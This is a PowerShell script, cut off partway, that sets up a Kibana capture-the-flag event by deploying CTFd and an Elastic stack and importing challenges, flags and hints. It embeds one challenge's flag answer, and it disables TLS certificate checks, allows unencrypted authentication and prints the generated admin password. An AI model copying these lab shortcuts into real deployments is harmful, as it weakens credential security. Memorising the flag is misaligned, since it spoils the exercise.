<#
.Synopsis
    This script is designed to setup the Kibana CTF created by Nicholas Penning. The goal of the script is to ease the
    setup process of deploying CTFd and an Elastic Stack for trying out this CTF. The latest versions of Elasticsearch,
    Kibana, and CTFd will be used. https://github.com/nicpenning/kibana-ctf

.DESCRIPTION
    This script is designed to setup the Kibana CTF created by Nicholas Penning. The goal of the script is to ease the
    setup process of deploying CTFd and an Elastic Stack for trying out this CTF. The latest versions of Elasticsearch,
    Kibana, and CTFd will be used. The script will provide many options such as deploying CTFd, the Elastic stack and
    importing the challenges into CTFd and the appropriate challenges into the Elastic stack. 

    WARNING: Challenges may be revealed if inspecting certain files in this project. Trust is the only layer between
    seeing and not seeing the challenge solutions. With this, if you are hosting this CTF, it is possible for players
    to find this repo and reveal all solutions. Honesty is the best policy here. The plan is to randomize the flags to
    keep make it a bit harder to reveal the secrets, but that won't stop persistant users to reveal all flags and
    solutions.

    Requirements:
        1. Internet Access (At least elastic.co & github.com)
        2. CTFd Instance (Token needs to be manually created and retrieved)
        3. Elasticsearch and Kibana Instance

    Tested for Elastic Stack 8.17.0+ and CTFd 3.7.4+

    Variable Options
    -Elasticsearch_URL "https://127.0.0.1:9200"
    -Kibana_URL "http://127.0.0.1:5601"
    -CTFd_URL "http://127.0.0.1:8000"
    -CTF_Start_Date "12/24/2024 12:00 PM" (default - Now) # To do
    -CTF_End_Date "12/24/2024 1:00 PM" (default - 1 hour from Start Date) # To do
    -CTFd_Randomize_Flags "False" (default False) # To do

.EXAMPLE
   .\Invoke-Kibana-CTF-Setup.ps1 -Elasticsearch_URL "http://127.0.0.1:9200" -Kibana_URL "https://127.0.0.1:5601" -CTFd_URL "http://127.0.0.1:8000" -CTF_Start_Date "12/24/2024 12:00 PM" -CTF_End_date "12/24/2024 3:00PM"
#>

Param (
    # -Elasticsearch URL. (default - https://127.0.0.1:9200)
    [Parameter(Mandatory=$false)]
    $Elasticsearch_URL = "https://127.0.0.1:9200",

    # Kibana URL. (default - http://127.0.0.1:5601)
    [Parameter(Mandatory=$false)]
    $Kibana_URL = "http://127.0.0.1:5601",
    
    # CTFd URL. (default - http://127.0.0.1:8000)
    [Parameter(Mandatory=$false)]
    $CTFd_URL = "http://127.0.0.1:8000",

    # CTF Start Date. (default - Now - To Do)
    [Parameter(Mandatory=$false)]
    $CTF_Start_Date = $([Math]::Floor([System.DateTimeOffset]::Now.ToUnixTimeSeconds())),

    # CTF End Date URL. (default - 1 hour from Start Date - To Do)
    [Parameter(Mandatory=$false)]
    $CTF_End_Date = $([math]::Round(($((Get-Date).AddHours(1)).ToUniversalTime() - [datetime]'1970-01-01T00:00:00Z').TotalSeconds)),

    # Random CTF flags to make answer unique everytime. (default - false - To Do)
    [Parameter(Mandatory=$false)]
    $CTFd_Randomize_Flags = "false" 
)

Begin {

    # CTFd Variables
    $CTFd_URL_API = $CTFd_URL+"/api/v1"

    # Elasticsearch Variables
    $ingestIndexURL = $Elasticsearch_URL+"/logs-kibna-ctf/_doc"

    function Get-CTFd-Creds {
        return Read-Host "Enter the token for the administrator account. Starts with ctfd_" -MaskInput
    }
    
    function Get-Elastic-Creds {
        return Get-Credential -Message "Enter the credentials for the elastic stack, recommended to use the default elastic account"
    }
    
    function Get-Challenges-From-CTFd {
        return Invoke-RestMethod -Method GET "$CTFd_URL_API/challenges" -ContentType "application/json" -Headers $ctfd_auth
    }

    function Get-CTFd-Admin-Token {
        $ctfd_token = Get-CTFd-Creds
        $ctfd_auth = @{"Authorization" = "Token $ctfd_token"}

        # Validate auth
        try{
            $validate = Invoke-RestMethod -Method GET -Uri "$CTFd_URL_API/pages"  -ContentType "application/json" -Headers $ctfd_auth
            if($validate){
                Write-Host "Valid token provided!" -ForegroundColor Green
            }else{
                Write-Host "Could not validate, try another token or checking your connection to $CTFd_URL_API/pages endpoint."
            }
        }catch{
            Write-Host "Could not validate token, exiting." -ForegroundColor Red
            $_.Exception
            exit
        }
        return $ctfd_auth
    }

    # Elastic Stack Setup Functions
    function Invoke-CheckForEnv {
        # Check for existing .env file for setup
        # Get Elasticsearch password from .env file
        if (Test-Path .\docker\.env) {
            Write-Host "Docker .env file found! Which likely means you have configured docker for use. Going to extract password to perform initilization."
            $env = Get-Content .\docker\.env
            $regExEnv = $env | Select-String -AllMatches -Pattern "ELASTIC_PASSWORD='(.*)'"
            $global:elasticsearchPassword = $regExEnv.Matches.Groups[1].Value
            if ($elasticsearchPassword) {
                Write-Host "Password for user elastic has been found and will be used." -ForegroundColor Green
                return "True", $elasticsearchPassword
            }
        } else {
        Write-Debug "No .env file detected in \docker\.env"
        return "False"
        }
    }
    
    function Invoke-CheckForDockerInUse {
        # Check to see if docker compose job is already running before starting it up again
        Write-Host "Checking to make sure Docker isn't already running."
        $jobs = Get-Job
        $dockerInUse = $($jobs.Command | ForEach-Object { $_ | select-string "docker compose up" })
        if ($dockerInUse) {
        Write-Host "Docker found to be running" -ForegroundColor Yellow
        return "True"
        } else {
        Write-Debug "Docker was not found to be running"
        return "False"
        }
    }
    
    function Invoke-CheckForElasticsearchStatus {
        # Check for Elastic stack connectivity to a healthy cluster
        Write-Host "Waiting for Elastic stack to be accessible." -ForegroundColor Blue
    
        $healthAPI = $Elasticsearch_URL+"/_cluster/health"
        # Keep checking for a healthy cluster that can be used for the initialization process!
        do {
            try {
                Write-Debug "Checking to see if the cluster is accessible. Please wait."
                $status = Invoke-RestMethod -Method Get -Uri $healthAPI -ContentType "application/json" -Credential $elasticCreds -AllowUnencryptedAuthentication -SkipCertificateCheck  
            } catch {
                Write-Debug "Waiting for healthy cluster for 5 seconds. Then checking again."
                $status
                Start-Sleep -Seconds 5
            }
        } until ("yellow" -eq $status.status -or "green" -eq $status.status)
    
        if ("yellow" -eq $status.status -or "green" -eq $status.status) {
        Write-Host "Elastic cluster is $($status.status), continuing through the setup process." -ForegroundColor Green
        Start-Sleep -Seconds 2
        }
    }
    
    function Invoke-StartDocker {
        # Check to see if Linux to set VM Max Map Count to ensure Elasticsearch can start
        if($IsLinux) {
        Write-Host "Linux OS detected, setting VM Max Map Count to 262144"
        sudo sysctl -w vm.max_map_count=262144
        }
        
        #Check to see if Docker on Windows
        if($IsWindows) {
        $dockerWSL2 = docker info | Select-String "WSL2"
    
        #Check to see if Docker on Windows is using WSL2 and configure accordingly
        if($dockerWSL2){
            Write-Host "Docker install was detected using WSL2, so an additional setting needs to be configured for memory consumption."
            $wslMaxMem = Read-Host "The following file will be created: "$ENV:USERPROFILE\.wslconfig" `nWould you like to continue?`n1. Yes`n2. No, exit`n(Enter 1 or 2)"
            if($wslMaxMem -eq 1){
            $maxmem = @"
    [wsl2]
    kernelCommandLine = "sysctl.vm.max_map_count=262144"
"@
            Write-Host "Creating file $ENV:USERPROFILE\.wslconfig with the contents of:$maxmem"
            try{
                $maxmem | Out-File "$ENV:USERPROFILE\.wslconfig"
                Write-Host "File created!" -ForegroundColor Green
            }catch{
                Write-Host "File could not be created." -ForegroundColor Red
            }
            }else{
            Write-Host "Required WSL file was not created, exiting."
            Exit
            }
        }else{
            Write-Host "Docker install was not detected using WSL2 so you might need to adjust your docker settings to allow additional RAM usage for this setup to work."
            Write-Host "If Elasticsearch never gets working then check your Docker containers to see if they exited and if so, check the logs and see why the failed and fix accordingly."
        }
        }
        
        Write-Host "Starting up the Elastic stack with docker, please be patient as this can take over 10 minutes to download and deploy the entire stack if this is the first time you executed this step.`nOtherwise this will take just a couple of minutes."
        Set-Location .\docker
        try {
        $composeVersion = docker compose version
        if($composeVersion){
            Write-Debug '"docker compose detected"'
            docker compose up -d
            Write-Host "Elastic Stack container started, navigate to $Kibana_URL to ensure it started okay.`nNote: It could a few minutes to get the Elastic stack running so be patient.)" -ForegroundColor Green
        }else{
            Throw '"docker compose" not detected, will now check for docker-compose'
        }
        } catch {
            Write-Debug "docker compose up -d failed - trying docker-compose up -d"
            try {
                $dockerComposeVersion = docker-compose version
                if($dockerComposeVersion){
                Write-Debug '"docker-compose detected"'
                docker-compose up -d
                }else{
                Throw '"docker-compose" not detected.'
                }
            } catch {
                Write-Host "docker compose up -d or docker-compose up -d did not work. Check that you have docker and docker composed installed."
            }
        }
        Set-Location ..\
    }
    
    function Invoke-StopDocker {
        Write-Debug "Shutting down docker containers for the Elastic stack."
        Set-Location .\docker
        try { 
        docker compose down
        } catch {
        Write-Host "Failed to use docker compose down, so trying docker-compose down."
        docker-compose down
        }
        Set-Location ..\
    }

    function Import-SavedObject {
        Param (
            $filename
        )
        
        $importSavedObjectsURL = $Kibana_URL+"/s/kibana-ctf/api/saved_objects/_import?overwrite=true"
        $kibanaHeader = @{"kbn-xsrf" = "true"; "Authorization" = "$kibanaAuth"}
        $savedObjectsFilePath =  Resolve-Path $filename
    
        $fileBytes = [System.IO.File]::ReadAllBytes($savedObjectsFilePath.path);
        $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
        $boundary = [System.Guid]::NewGuid().ToString(); 
        $LF = "`r`n";
    
        $bodyLines = ( 
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"saved_object.ndjson`"",
            "Content-Type: application/octet-stream$LF",
            $fileEnc,
            "--$boundary--$LF" 
        ) -join $LF
    
        $result = Invoke-RestMethod -Method POST -Uri $importSavedObjectsURL -Headers $kibanaHeader -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines -AllowUnencryptedAuthentication
        if($result.errors -or $null -eq $result){
            Write-Host "There was an error trying to import $filename"
            $result.errors
        }else{
            Write-Host "Imported $filename" -ForegroundColor Green
        }
    }

    function Invoke-Create-Kibana-CTF-Space {
        Param(
            $Kibana_URL
        )

        $createKibanaCTFSpaceURL = $Kibana_URL+"/api/spaces/space"
        $deleteKibanaCTFSpaceURL = $Kibana_URL+"/api/spaces/space/kibana-ctf"
        $kibanaHeader = @{"kbn-xsrf" = "true"; "Authorization" = "$kibanaAuth"}

        $spaceJSON = [PSCustomObject]@{
            "id" = "kibana-ctf"
            "name" = "Kibana CTF"
            "color" = "#FFFFFF"
            #"imageUrl" = "data:image/png;base64,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"
            "initials" = "KC"
            "description" = "This is the Kibana CTF Space! Let's go!!!"
            "disabledFeatures"=  @("enterpriseSearch","logs","infrastructure","apm","inventory","uptime","observabilityCasesV2","slo","siem","securitySolutionCasesV2","dev_tools","advancedSettings","indexPatterns","filesManagement","filesSharedImage","savedObjectsManagement","savedQueryManagement","savedObjectsTagging","osquery","actions","generalCasesV2","guidedOnboardingFeature","rulesSettings","maintenanceWindow","stackAlerts","fleetv2","fleet","dataQuality","monitoring","canvas","maps","ml","dashboard")
        } | ConvertTo-Json

        # Create the space!
        try{
            $result = Invoke-RestMethod -Method POST -Uri $createKibanaCTFSpaceURL -Headers $kibanaHeader -ContentType "application/json" -Body $spaceJSON -AllowUnencryptedAuthentication
        }catch{
            # Delete and try again if Kibana CTF Space already exists.
            Write-Host "Failed to create the Kibana CTF space. Going to delete it if it exists and try to create it again." -ForegroundColor Yellow
            Invoke-RestMethod -Method DELETE -Uri $deleteKibanaCTFSpaceURL -Headers $kibanaHeader -ContentType "application/json" -AllowUnencryptedAuthentication
            $result = Invoke-RestMethod -Method POST -Uri $createKibanaCTFSpaceURL -Headers $kibanaHeader -ContentType "application/json" -Body $spaceJSON -AllowUnencryptedAuthentication
        }
        $result = Invoke-RestMethod -Method POST -Uri $createKibanaCTFSpaceURL -Headers $kibanaHeader -ContentType "application/json" -Body $spaceJSON -AllowUnencryptedAuthentication

        if($result.errors -or $null -eq $result){
            Write-Host "There was an error trying to import the Kibana CTF Space." -ForegroundColor Yellow
            $result.errors
        }else{
            Write-Host "Created Kibana CTF Space!" -ForegroundColor Green
        }
    }

    function Invoke-Ingest-Elasticsearch-Documents {
        Param (
            $documentToIngest,
            $customUrl
        )

        # Check for custom URL and if it exists, use the PUT, otherwise, ingest a single doc
        if($null -ne $customUrl){
            try {
                $result = Invoke-RestMethod -Method PUT -Uri $customUrl -Body $documentToIngest -ContentType "application/json" -Credential $elasticCreds -AllowUnencryptedAuthentication -SkipCertificateCheck
            } catch {
                Write-Host "Couldn't ingest ctf data. Check kibana to see if the ctf data already exists." -ForegroundColor Yellow
                Write-Debug "$_"
            }
        }else{
            try {
                $result = Invoke-RestMethod -Method POST -Uri $ingestIndexURL -Body $documentToIngest -ContentType "application/json" -Credential $elasticCreds -AllowUnencryptedAuthentication -SkipCertificateCheck
            } catch {
                Write-Host "Couldn't ingest ctf data. Check kibana to see if the ctf data already exists." -ForegroundColor Yellow
                Write-Debug "$_"
            }
        }

        return $result
    }

    $option1 = "1. Deploy CTFd"
    $option2 = "2. Import CTFd Challenges, Flags, etc."
    $option3 = "3. Reset CTFd"
    $option4 = "4. Deploy Elastic Stack"
    $option5 = "5. Import Objects and Index Documents for Elastic Stack"
    $option6 = "6. Reset Elastic Stack"
    $option7 = "7. Check for Requirements"
    $option8 = "8. Deploy all from scratch"

    $quit = "Q. Quit"

    function Show-Menu {
        Write-Host "Welcome to the Kibana CTF Setup Script!" -ForegroundColor Blue
        Write-Host "What would you like to do?" -ForegroundColor Yellow
        Write-Host $option1
        Write-Host $option2
        Write-Host $option3
        Write-Host $option4
        Write-Host $option5
        Write-Host $option6
        Write-Host $option7
        Write-Host $option8

        Write-Host $quit
    }

}

Process {

    while ($true -ne $finished) {
        # Show Menu if script was not provided the choice on execution using the Option_Selected variable
        if ($null -eq $Option_Selected -or $Option_Selected) {
            Show-Menu
            $Option_Selected = Read-Host "Enter your choice"
        }

        switch ($Option_Selected) {
            '1' {
                # 1. Deploy CTFd

                # Check to see if CTFd has been deployed, and if not, ask to deploy.
                if($null -ne (get-item ../CTFd)){
                    $runCTFd = Read-host "CTFd directory detected! Would you like to run CTFd via docker? (y or n)"
                    if($runCTFd -match "y"){
                        Set-Location ../CTFd
                        Write-Host "Bringing CTFd up! (Use docker compose down anytime from the CTFd directory to stop the container)" -ForegroundColor Green
                        docker compose up -d
                        Set-Location ../kibana-ctf/
                        Write-Host "CTFd downloaded and began the process to bring it up. Navigate to $CTFd_URL to continue the setup process.`nNote: It could take a few minutes for the container to come up." -ForegroundColor Green
                    }else{
                        Write-Host "You said no, you do not wish to run CTFd, exiting." -ForegroundColor Yellow
                    }
                }else{
                    $runCTFd = Read-host "CTFd directory not detected, would you like to download and run CTFd via docker? (y or n)"
                    if($runCTFd -match "y"){
                        Set-Location ../
                        git clone https://github.com/CTFd/CTFd.git
                        Set-Location ./CTFd/
                        Write-Host "Bringing CTFd up! (Use docker compose down anytime from the CTFd directory to stop the container)" -ForegroundColor Green
                        docker compose up -d
                        Set-Location ../kibana-ctf/
                        Write-Host "CTFd downloaded and began the process to bring it up. Navigate to $CTFd_URL to continue the setup process.`nNote: It could take a few minutes for the container to come up." -ForegroundColor Green
                    }else{
                        Write-Host "You said no, you do not wish to deploy and run CTFd, exiting." -ForegroundColor Yellow
                    }
                }


                $finished = $true
                break
            }
            '2' {
                # 2. Import CTFd Challenges, Flags, Hints, Config, Pages, and Files
                # Setup up Auth header
                $ctfd_auth = Get-CTFd-Admin-Token

                # Retrieve challenges from challenges.json file and convert it into an object
                $challenges_object = Get-Content './CTFd_Events/JSON Configuration Files/challenges.json' | ConvertFrom-Json -Depth 10
                $dynamic_challenges_object = Get-Content './CTFd_Events/JSON Configuration Files/dynamic_challenge.json' | ConvertFrom-Json -Depth 10
                $flags_object = Get-Content './CTFd_Events/JSON Configuration Files/flags.json' | ConvertFrom-Json -Depth 10
                $hints_object = Get-Content './CTFd_Events/JSON Configuration Files/hints.json' | ConvertFrom-Json -Depth 10
                $pages_object = Get-Content './CTFd_Events/JSON Configuration Files/pages.json' | ConvertFrom-Json -Depth 10
                $config_object = Get-Content './CTFd_Events/JSON Configuration Files/config.json' | ConvertFrom-Json -Depth 10
                $files_object = Get-Content './CTFd_Events/JSON Configuration Files/files.json' | ConvertFrom-Json -Depth 10

                # Import Challenges 1 by 1
                Write-Host "Importing $($challenges_object.results.count) challenges"
                Pause
                $challenges_object.results | Sort-Object -Property "next_id" | ForEach-Object {
                    # Get current challenge
                    $current_challenge_object = $_
                    $current_challenge = $_ | ConvertTo-Json -Compress

                    # Check for Dynamic Challenge
                    if($_.type -eq "dynamic"){
                        Write-Host "Dynamic challenge found! Adding additional details before import." -ForegroundColor Yellow
                        # Find the dynamic challenge related to the current challenge being imported and add the details as needed.
                        $dynamic_challenge_details = $dynamic_challenges_object.results | Where-Object {$_.id -eq $current_challenge_object.id}
                        $dynamic_challenge_details.PSObject.Members | Where-Object {$_.MemberType -eq "NoteProperty" -and $_.Name -ne "id"} | ForEach-Object {
                            $current_challenge_object | Add-Member -NotePropertyName $_.Name -NotePropertyValue $_.Value
                        }
                        # Convert new object to JSON and Import!
                        $current_challenge = $current_challenge_object | ConvertTo-Json -Compress -Depth 10
                    }
                    Write-Host "Importing challenge: $($_.name)"
                    try{
                        $import_challenge = Invoke-RestMethod -Method POST "$CTFd_URL_API/challenges" -ContentType "application/json" -Headers $ctfd_auth -Body $current_challenge
                        Write-Host "Imported challenge $($current_challenge.name) - $($import_challenge.success)"
                    }catch{
                        Write-Host "Could not import challenge: $($current_challenge.name) - $($_.id)"
                        $_.Exception
                    }
                }

                # Import Flags 1 by 1
                Write-Host "Importing $($flags_object.results.count) flags"
                Pause
                $flags_object.results | ForEach-Object {
                    # Get current flag
                    $current_flag = $_ | ConvertTo-Json -Compress

                    Write-Host "Importing flags for Challenge ID: $($_.challenge_id)"
                    try{
                        # Adjust dynamic incident challenge
                        if($current_flag -match '"content":"38"'){
                            Write-Host "Incident Challenge detected, updating dynamic challenge answer."
                            $days = $($($(Get-date)-$(Get-Date 2024-11-12T07:43:13.373Z) ).Days)
                            $current_flag = $current_flag -replace '"content":"38"', $('"content":"'+"$($days-1)|$days|$($days+1)"+'"')
                        } elseif ($current_flag -match 'ctf_38_days_since_last_incident'){
                            Write-Host "Incident Challenge detected, updating dynamic challenge answer."
                            $days = $($($(Get-date)-$(Get-Date 2024-11-12T07:43:13.373Z) ).Days)
                            $current_flag = $current_flag -replace 'ctf_38_days_since_last_incident', $('ctf_('+"$($days-1)|$days|$($days+1)"+')_days_since_last_incident')
                        }

                        $import_flag = Invoke-RestMethod -Method POST "$CTFd_URL_API/flags" -ContentType "application/json" -Headers $ctfd_auth -Body $current_flag
                        Write-Host "Imported flag $($_.id) - $($import_flag.success)"
                    }catch{
                        Write-Host "Could not import flag: $($current_challenge.name) - $($_.id)"
                        $_.Exception
                    }
                }

                # Import Hints 1 by 1
                Write-Host "Importing $($hints_object.results.count) hints"
                Pause
                $hints_object.results | ForEach-Object {
                    # Get current flag
                    $current_hints = $_ | ConvertTo-Json -Compress

                    Write-Host "Importing flags for Challenge ID: $($_.challenge_id)"
                    try{
                        $import_hints = Invoke-RestMethod -Method POST "$CTFd_URL_API/hints" -ContentType "application/json" -Headers $ctfd_auth -Body $current_hints
                        Write-Host "Imported flag $($_.id) - $($import_hints.success)"
                    }catch{
                        Write-Host "Could not import hint: $($_.id) for challenge id: $($_.challenge_id)"
                        $_.Exception
                    }
                }

                # Import Page(s) 1 by 1
                Write-Host "Importing $($pages_object.results.count) page(s)"
                Pause
                $pages_object.results | ForEach-Object {
                    # Get current flag
                    $current_pages = $_ | ConvertTo-Json -Compress

                    Write-Host "Importing page: $($_.title)"
                    try{
                        $import_pages = Invoke-RestMethod -Method POST "$CTFd_URL_API/pages" -ContentType "application/json" -Headers $ctfd_auth -Body $current_pages
                        Write-Host "Imported page $($_.title) - $($import_pages.success)"
                    }catch{
                        Write-Host "Could not import page: $($_.title)"
                        Write-Host "Will try to update the current page."
                        try{
                            $update_pages = Invoke-RestMethod -Method PATCH "$CTFd_URL_API/pages/1" -ContentType "application/json" -Headers $ctfd_auth -Body $current_pages
                            Write-Host "Pages updated: $($update_pages.success)"
                        }catch{
                            Write-Host "Could not import page: $($_.title)"
                            Write-Host "Note: This shouldn't impact the CTF platform if everything else worked."
                            $_.Exception
                        }
                    }
                }

                # Import Config
                Write-Host "Importing $($config_object.results.count) config option(s)"
                Pause
                $config_object.results | ForEach-Object {
                    # Get current flag
                    $current_config = $_ | ConvertTo-Json -Compress

                    Write-Host "Importing config option: $($_.key)"
                    try{
                        $import_config = Invoke-RestMethod -Method POST "$CTFd_URL_API/configs" -ContentType "application/json" -Headers $ctfd_auth -Body $current_config
                        Write-Host "Imported config option: $($_.key)- $($import_config.success)" -ForegroundColor Green
                    }catch{
                        Write-Host "Could not import config."
                        $_.Exception
                    }
                }

                # Import Files
                Write-Host "Importing $($files_object.results.count) file(s)"
                Pause
                $files_object.results | ForEach-Object {
                    # Get current flag
                    $current_file = $_ | ConvertTo-Json -Compress

                    Write-Host "Importing file: $($_.location)"
                    try{
                        $import_file = Invoke-RestMethod -Method POST "$CTFd_URL_API/files" -ContentType "application/json" -Headers $ctfd_auth -Body $current_file
                        Write-Host "Imported file: $($_.location)- $($import_file.success)" -ForegroundColor Green
                    }catch{
                        Write-Host "Could not import config."
                        $_.Exception
                    }
                }

                $finished = $true
                break
            }
            '3' {
                # Reset CTFd
                # Setup up Auth header
                $ctfd_auth = Get-CTFd-Admin-Token

                # Get Challenges
                $challenges = Get-Challenges-From-CTFd

                # Remove Challenges 1 by 1
                Write-Host "Removing $($challenges.data.count) challenges"
                $challenges.data | ForEach-Object {
                    # Get all challenge details per challenge
                    $id = $_.id
                    $challenge_info = Invoke-RestMethod -Method Get "$CTFd_URL_API/challenges/$id" -ContentType "application/json" -Headers $ctfd_auth
                    Write-Host "Removing challenge: $($challenge_info.data.name)"
                    try{
                        $remove_challenge = Invoke-RestMethod -Method Delete "$CTFd_URL_API/challenges/$id" -ContentType "application/json" -Headers $ctfd_auth
                        Write-Host "Removed challenge $($challenge_info.data.name) - $($remove_challenge.success)"
                    }catch{
                        Write-Host "Could not remove challenge: $($challenge_info.data.name) - $id"
                        $_.Exception
                    }
                }

                $finished = $true
                break
            }
            '4' {
                # 4. Deploy Elastic Stack
                
                # Check to see if various parts of the project have already been configured to reduce the need for user input.
                # 1. Check to see if .env file exists with credentials.
                if ($(Invoke-CheckForEnv) -eq "False") {
                    # Choose to use docker or not. If no .env is found, then ask.
                    $dockerChoice = Read-Host "Would you like to use docker with this project? `
                1. Yes, please generate a secure .env file. (Recommended) `
                2. No thanks, I know what I am doing or I already have a .env file ready to go.`
                Please Choose (1 or 2)"
                
                    if ($dockerChoice -eq "1") {
                    # Generate a .env file with random passwords for Elasticsearch and Kibana. Also generate secure Kibana key for reporting funcationality.
                    $env = Get-Content .\docker\.env_template
                    
                    # Replace $elasticsearchPassword
                    $elasticsearchPassword = $(-Join (@('0'..'9';'A'..'Z';'a'..'z';'!';'@';'#') | Get-Random -Count 32))
                    $env = $env.Replace('$elasticsearchPassword', $elasticsearchPassword) 
                    
                    # Replace $kibanaPassword
                    $kibanaPassword = $(-Join (@('0'..'9';'A'..'Z';'a'..'z';'!';'@';'#') | Get-Random -Count 32))
                    $env = $env.Replace('$kibanaPassword', $kibanaPassword)
                
                    # Replace $kibanaEncryptionKey
                    $kibanaEncryptionKey = $(-Join (@('0'..'9';'A'..'Z';'a'..'z';'!';'@';'#') | Get-Random -Count 32))
                    $env = $env.Replace('$kibanaEncryptionKey', $kibanaEncryptionKey)
                
                    $env | Out-File .\docker\.env
                
                    Write-Host "New file has been created (.env) and is ready for use." -ForegroundColor Green
                    Write-Host "The following credentials will be used for setup and access to your Elastic stack so keep it close." -ForegroundColor Blue
                    Write-Host "Username : elastic`nPassword : $elasticsearchPassword"
                    Pause
                    } else {
                    Write-Debug "Did not choose to use docker so ignoring docker setup."
                    }
                } else {
                    Write-Debug "Docker .env file already exists with password skipping to next section."
                }
                
                # 2. Check to see if docker compose has been executed.
                if (Invoke-CheckForDockerInUse -eq "False") {
                    # Choose to start docker.
                    $startStack = Read-Host "Would you like to start up the Elastic stack with docker? `
                1. Yes, please run the docker commands to start the Elastic stack for me (Recommended) `
                2. No thanks, I will get my cluster up and running without your help and then continue the process `
                Please Choose (1 or 2)"
                
                    if ($startStack -eq "1") {
                        Invoke-StartDocker
                    } elseif ($startStack -eq "2") {
                        Write-Debug "Skipping to next part of the process."
                    } else {
                        Write-Debug "Not a valid option. Exiting."
                        exit
                    }
                } elseif (Invoke-CheckForDockerInUse -eq "True") {
                    Write-Host "Docker found to be running. Would you like to stop and then start Docker?"
                    $restartDocker = Read-Host "1. Yes, please restart Docker`n2. No, please leave it running.`nPlease Choose (1 or 2)"
                    if ($restartDocker -eq 1) {
                        Write-Host "Stopping current docker instances by bringing them down with docker compose down."
                        Invoke-StopDocker
                        Write-Host "Starting docker containers back up with docker compose up -d &"
                        Invoke-StartDocker
                    } else {
                        Write-Debug "Continuing with current docker instance running."
                    }
                } else {
                    Write-Host "Something is amiss, couldn't check to see if Docker was in use or not. Exiting." -ForegroundColor Yellow
                    exit
                }
                
                
                # Configure Elasticsearch credentials for creating the Elasticsearch ingest pipelines and importing saved objects into Kibana.
                # Force usage of elastic user by trying genereated creds first, then manual credential harvest
                if ($elasticsearchPassword) {
                    Write-Host "Elastic credentials detected! Going to use those for the setup process." -ForegroundColor Blue
                    $elasticsearchPasswordSecure = ConvertTo-SecureString -String "$elasticsearchPassword" -AsPlainText -Force
                    $elasticCreds = New-Object System.Management.Automation.PSCredential -ArgumentList "elastic", $elasticsearchPasswordSecure
                } else {
                    Write-Host "No generated credentials were found! Going to need the password for the elastic user." -ForegroundColor Yellow
